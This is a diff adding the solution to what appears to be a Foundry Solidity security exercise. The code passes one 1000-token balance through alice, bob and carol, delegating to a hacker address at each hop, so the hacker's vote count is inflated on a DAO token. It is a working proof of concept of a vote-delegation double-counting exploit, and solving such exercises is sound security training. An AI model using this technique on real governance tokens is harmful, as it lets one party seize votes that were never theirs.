@@ -24,7 +24,23 @@ contract exploitTest is Test {
         vm.startPrank(alice);
 
         // write your solution here
+        
+        //hacker以 alice 的private-key操作
+        daoToken.transfer(bob, 1000);
 
+        //hacker以 bob 的private-key操作
+        vm.startPrank(bob);
+		daoToken.delegate(hacker);
+		daoToken.transfer(carol, 1000);
+
+        //hacker以 carol 的private-key操作
+		vm.startPrank(carol);
+		daoToken.delegate(hacker);
+		daoToken.transfer(hacker, 1000); 
+
+		vm.startPrank(hacker);
+		daoToken.delegate(hacker); 
+        // end
         vm.stopPrank();
 
         uint256 hacker_vote = daoToken.getVotes(hacker);
